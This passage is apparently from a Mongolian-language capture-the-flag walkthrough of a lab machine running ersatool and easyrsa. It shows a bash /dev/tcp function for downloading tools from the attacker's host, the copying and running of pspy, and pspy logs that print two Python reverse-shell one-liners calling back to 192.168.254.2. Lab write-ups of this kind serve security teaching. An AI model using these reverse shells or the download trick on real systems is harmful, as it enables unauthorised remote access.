</span></span></code></pre></div><p>ersatool - г ажилуулж болох эсэх:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -name ersatool.* 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/src/ersatool.c
</span></span></code></pre></div><p><code>http</code> сервер асаах:</p><pre tabindex=0><code>python3 -m http.server 1337
</code></pre><p><code>PSPY</code> ажилууллах, <code>wget</code>, <code>curl</code> байхгүй болохоор өөр арга:
Bash script -г <code>www-data@pki</code>-с бичнэ:</p><p>1</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#66d9ef>function</span> __curl<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>  
</span></span><span style=display:flex><span>  read proto server path <span style=color:#f92672>&lt;&lt;&lt;</span><span style=color:#66d9ef>$(</span>echo <span style=color:#e6db74>${</span>1//// <span style=color:#e6db74>}</span><span style=color:#66d9ef>)</span>  
</span></span><span style=display:flex><span>  DOC<span style=color:#f92672>=</span>/<span style=color:#e6db74>${</span>path// //<span style=color:#e6db74>}</span>  
</span></span><span style=display:flex><span>  HOST<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>server//:*<span style=color:#e6db74>}</span>  
</span></span><span style=display:flex><span>  PORT<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>server//*:<span style=color:#e6db74>}</span>  
</span></span><span style=display:flex><span>  <span style=color:#f92672>[[</span> x<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>HOST<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>==</span> x<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>PORT<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]]</span> <span style=color:#f92672>&amp;&amp;</span> PORT<span style=color:#f92672>=</span>80exec **3**&lt;&gt;/dev/tcp/<span style=color:#e6db74>${</span>HOST<span style=color:#e6db74>}</span>/$PORT  
</span></span><span style=display:flex><span>  echo -en <span style=color:#e6db74>&#34;GET </span><span style=color:#e6db74>${</span>DOC<span style=color:#e6db74>}</span><span style=color:#e6db74> HTTP/1.0\r\nHost: </span><span style=color:#e6db74>${</span>HOST<span style=color:#e6db74>}</span><span style=color:#e6db74>\r\n\r\n&#34;</span> &gt;**&amp;3**  
</span></span><span style=display:flex><span>  <span style=color:#f92672>(</span><span style=color:#66d9ef>while</span> read line; <span style=color:#66d9ef>do</span>  
</span></span><span style=display:flex><span>   <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#34;</span>$line<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>$&#39;\r&#39;</span> <span style=color:#f92672>]]</span> <span style=color:#f92672>&amp;&amp;</span> break  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>done</span> <span style=color:#f92672>&amp;&amp;</span> cat<span style=color:#f92672>)</span> &lt;**&amp;3**  
</span></span><span style=display:flex><span>  exec **3**&gt;&amp;-  
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>2</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>__curl http://192.168.254.2:1337/pspy &gt; pspy
</span></span></code></pre></div><p>хуулах:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>scp -P <span style=color:#ae81ff>2222</span> -i id_rsa_www-data pspy64s www-data@10.10.10.246:/tmp/pspy
</span></span></code></pre></div><p>pspy ажилуулах:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@pki:/tmp/www$ chmod +x pspy  
</span></span><span style=display:flex><span>www-data@pki:/tmp/www$ ./pspy | tee log
</span></span></code></pre></div><p>pspy ажилуулаад ersatool (create, a,b print, exit..) юу хийж байгааг харсан. Хоёр REV SHELL хэрэгтэй болсон:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@pki:/tmp/www$ chmod +x pspy  
</span></span><span style=display:flex><span>www-data@pki:/tmp/www$ ./pspy  
</span></span><span style=display:flex><span>pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
</span></span><span style=display:flex><span>     ██▓███    ██████  ██▓███ ▓██   ██▓  
</span></span><span style=display:flex><span>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒  
</span></span><span style=display:flex><span>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░  
</span></span><span style=display:flex><span>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░  
</span></span><span style=display:flex><span>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░  
</span></span><span style=display:flex><span>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒  
</span></span><span style=display:flex><span>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░  
</span></span><span style=display:flex><span>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
</span></span><span style=display:flex><span>                   ░           ░ ░  
</span></span><span style=display:flex><span>                               ░ ░Config: Printing events <span style=color:#f92672>(</span>colored<span style=color:#f92672>=</span>true<span style=color:#f92672>)</span>: processes<span style=color:#f92672>=</span>true | file-system-events<span style=color:#f92672>=</span>false <span style=color:#f92672>||</span>| Scannning <span style=color:#66d9ef>for</span> processes every 100ms and on inotify events <span style=color:#f92672>||</span>| Watching directories: <span style=color:#f92672>[</span>/usr /tmp /etc /home /var /opt<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>recursive<span style=color:#f92672>)</span> | <span style=color:#f92672>[]</span> <span style=color:#f92672>(</span>non-recursive<span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span>Draining file system events due to startup...  
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>9</span>      | nginx: master process nginx  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>7</span>      | /bin/bash /entry.sh  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>542</span>    | php-fpm: pool www  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>541</span>    | php-fpm: pool www  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>540</span>    | php-fpm: pool www  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>539</span>    | php-fpm: pool www  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>538</span>    | php-fpm: pool www  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1950</span>   | ./pspy  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1935</span>   | /bin/bash  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1934</span>   | python3 -c import pty; pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span><span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1931</span>   | /bin/bash  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1930</span>   | python3 -c import pty; pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span><span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1927</span>   | /bin/bash  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1926</span>   | //usr/bin/python3.6 -c import socket,subprocess,os;s<span style=color:#f92672>=</span>socket.socket<span style=color:#f92672>(</span>socket.AF_INET,socket.SOCK_STREAM<span style=color:#f92672>)</span>;s.connect<span style=color:#f92672>((</span><span style=color:#e6db74>&#34;192.168.254.2&#34;</span>,9002<span style=color:#f92672>))</span>;os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,0<span style=color:#f92672>)</span>; os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,1<span style=color:#f92672>)</span>;os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,2<span style=color:#f92672>)</span>;import pty; pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span><span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1925</span>   | sh -c //usr/bin/python3.6 -c <span style=color:#e6db74>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.254.2&#34;,9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1921</span>   | /bin/bash  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1920</span>   | //usr/bin/python3.6 -c import socket,subprocess,os;s<span style=color:#f92672>=</span>socket.socket<span style=color:#f92672>(</span>socket.AF_INET,socket.SOCK_STREAM<span style=color:#f92672>)</span>;s.connect<span style=color:#f92672>((</span><span style=color:#e6db74>&#34;192.168.254.2&#34;</span>,9001<span style=color:#f92672>))</span>;os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,0<span style=color:#f92672>)</span>; os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,1<span style=color:#f92672>)</span>;os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,2<span style=color:#f92672>)</span>;import pty; pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span><span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1919</span>   | sh -c //usr/bin/python3.6 -c <span style=color:#e6db74>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.254.2&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>12</span>     | php-fpm: master process <span style=color:#f92672>(</span>/usr/local/etc/php-fpm.conf<span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>11</span>     | nginx: worker process  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>     | nginx: worker process  
</span></span><span style=display:flex><span>2021/06/25 02:46:00 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>      | /bin/sh -c /entry.sh  
</span></span><span style=display:flex><span>2021/06/25 02:46:03 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1959</span>   | /usr/bin/ersatool  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1961</span>   | sh -c /opt/easyrsa/easyrsa build-client-full a nopass batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1960</span>   | /usr/bin/ersatool  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1962</span>   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1963</span>   | sed -e s<span style=color:#e6db74>`</span>ENV::EASYRSA<span style=color:#e6db74>`</span>EASYRSA<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$dir<span style=color:#e6db74>`</span>/opt/easyrsa/pki<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_PKI<span style=color:#e6db74>`</span>/opt/easyrsa/pki<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_CERT_EXPIRE<span style=color:#e6db74>`</span>36500<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_CRL_DAYS<span style=color:#e6db74>`</span>180<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DIGEST<span style=color:#e6db74>`</span>sha256<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_KEY_SIZE<span style=color:#e6db74>`</span>2048<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DIGEST<span style=color:#e6db74>`</span>sha256<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DN<span style=color:#e6db74>`</span>cn_only<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_COUNTRY<span style=color:#e6db74>`</span>US<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_PROVINCE<span style=color:#e6db74>`</span>California<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_CITY<span style=color:#e6db74>`</span>San Francisco<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_ORG<span style=color:#e6db74>`</span>Copyleft Certificate Co<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_OU<span style=color:#e6db74>`</span>My Organizational Unit<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_CN<span style=color:#e6db74>`</span>ChangeMe<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_EMAIL<span style=color:#e6db74>`</span>me@example.net<span style=color:#e6db74>`</span>g /opt/easyrsa/pki/openssl-easyrsa.cnf  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1964</span>   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1965</span>   | openssl version  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1966</span>   | sed -e s<span style=color:#e6db74>`</span>ENV::EASYRSA<span style=color:#e6db74>`</span>EASYRSA<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$dir<span style=color:#e6db74>`</span>/opt/easyrsa/pki<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_PKI<span style=color:#e6db74>`</span>/opt/easyrsa/pki<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_CERT_EXPIRE<span style=color:#e6db74>`</span>36500<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_CRL_DAYS<span style=color:#e6db74>`</span>180<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DIGEST<span style=color:#e6db74>`</span>sha256<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_KEY_SIZE<span style=color:#e6db74>`</span>2048<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DIGEST<span style=color:#e6db74>`</span>sha256<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DN<span style=color:#e6db74>`</span>cn_only<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_COUNTRY<span style=color:#e6db74>`</span>US<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_PROVINCE<span style=color:#e6db74>`</span>California<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_CITY<span style=color:#e6db74>`</span>San Francisco<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_ORG<span style=color:#e6db74>`</span>Copyleft Certificate Co<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_OU<span style=color:#e6db74>`</span>My Organizational Unit<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_CN<span style=color:#e6db74>`</span>a<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_EMAIL<span style=color:#e6db74>`</span>me@example.net<span style=color:#e6db74>`</span>g /opt/easyrsa/pki/openssl-easyrsa.cnf  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1967</span>   | sed -e s<span style=color:#e6db74>`</span>ENV::EASYRSA<span style=color:#e6db74>`</span>EASYRSA<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$dir<span style=color:#e6db74>`</span>/opt/easyrsa/pki<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_PKI<span style=color:#e6db74>`</span>/opt/easyrsa/pki<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_CERT_EXPIRE<span style=color:#e6db74>`</span>36500<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_CRL_DAYS<span style=color:#e6db74>`</span>180<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DIGEST<span style=color:#e6db74>`</span>sha256<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_KEY_SIZE<span style=color:#e6db74>`</span>2048<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DIGEST<span style=color:#e6db74>`</span>sha256<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DN<span style=color:#e6db74>`</span>cn_only<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_COUNTRY<span style=color:#e6db74>`</span>US<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_PROVINCE<span style=color:#e6db74>`</span>California<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_CITY<span style=color:#e6db74>`</span>San Francisco<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_ORG<span style=color:#e6db74>`</span>Copyleft Certificate Co<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_OU<span style=color:#e6db74>`</span>My Organizational Unit<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_CN<span style=color:#e6db74>`</span>a<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_EMAIL<span style=color:#e6db74>`</span>me@example.net<span style=color:#e6db74>`</span>g /opt/easyrsa/pki/openssl-easyrsa.cnf  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1968</span>   | mktemp /opt/easyrsa/pki/private/a.key.XXXXXXXXXX  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1969</span>   | mktemp /opt/easyrsa/pki/reqs/a.req.XXXXXXXXXX  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1970</span>   | openssl req -utf8 -new -newkey rsa:2048 -config /opt/easyrsa/pki/safessl-easyrsa.cnf -keyout /opt/easyrsa/pki/private/a.key.HZbmrNjLDK -out /opt/easyrsa/pki/reqs/a.req.BOyXzgidnO -nodes -batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1971</span>   |  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1972</span>   | mv /opt/easyrsa/pki/reqs/a.req.BOyXzgidnO /opt/easyrsa/pki/reqs/a.req  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1973</span>   | openssl rand -hex -out /opt/easyrsa/pki/serial <span style=color:#ae81ff>16</span>  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1974</span>   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1975</span>   | openssl ca -config /opt/easyrsa/pki/openssl-easyrsa.cnf -status 2243a379dfbe067da1fa206727f760b3  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1976</span>   | sed -e s<span style=color:#e6db74>`</span>ENV::EASYRSA<span style=color:#e6db74>`</span>EASYRSA<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$dir<span style=color:#e6db74>`</span>/opt/easyrsa/pki<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_PKI<span style=color:#e6db74>`</span>/opt/easyrsa/pki<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_CERT_EXPIRE<span style=color:#e6db74>`</span>36500<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_CRL_DAYS<span style=color:#e6db74>`</span>180<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DIGEST<span style=color:#e6db74>`</span>sha256<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_KEY_SIZE<span style=color:#e6db74>`</span>2048<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DIGEST<span style=color:#e6db74>`</span>sha256<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_DN<span style=color:#e6db74>`</span>cn_only<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_COUNTRY<span style=color:#e6db74>`</span>US<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_PROVINCE<span style=color:#e6db74>`</span>California<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_CITY<span style=color:#e6db74>`</span>San Francisco<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_ORG<span style=color:#e6db74>`</span>Copyleft Certificate Co<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_OU<span style=color:#e6db74>`</span>My Organizational Unit<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_CN<span style=color:#e6db74>`</span>a<span style=color:#e6db74>`</span>g -e s<span style=color:#e6db74>`</span>$EASYRSA_REQ_EMAIL<span style=color:#e6db74>`</span>me@example.net<span style=color:#e6db74>`</span>g /opt/easyrsa/pki/openssl-easyrsa.cnf  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1977</span>   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1979</span>   | openssl req -in /opt/easyrsa/pki/reqs/a.req -noout -subject -nameopt multiline  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1978</span>   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1980</span>   | cat /opt/easyrsa/x509-types/COMMON  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1983</span>   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch  
</span></span><span style=display:flex><span>2021/06/25 02:46:35 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1984</span>   | awk  
</span></span><span style=display:flex><span>BEGIN <span style=color:#f92672>{</span>IGNORECASE<span style=color:#f92672>=</span>1; r<span style=color:#f92672>=</span>2<span style=color:#f92672>}</span>  
